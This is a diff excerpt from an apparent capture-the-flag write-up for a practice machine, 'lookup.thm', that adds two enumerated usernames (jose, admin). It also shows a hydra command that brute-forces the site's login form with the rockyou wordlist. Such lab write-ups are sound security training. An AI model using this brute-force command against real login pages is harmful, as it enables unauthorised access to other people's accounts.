@@ -17,8 +17,9 @@ We can write a small python script that would help us enumerate valid usernames:
 
 Using this scripts found  some users:
 
+jose
+admin
    
-
 Now lets try a brute force for user jose using hydra:
 ``` bash
  hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong" -V
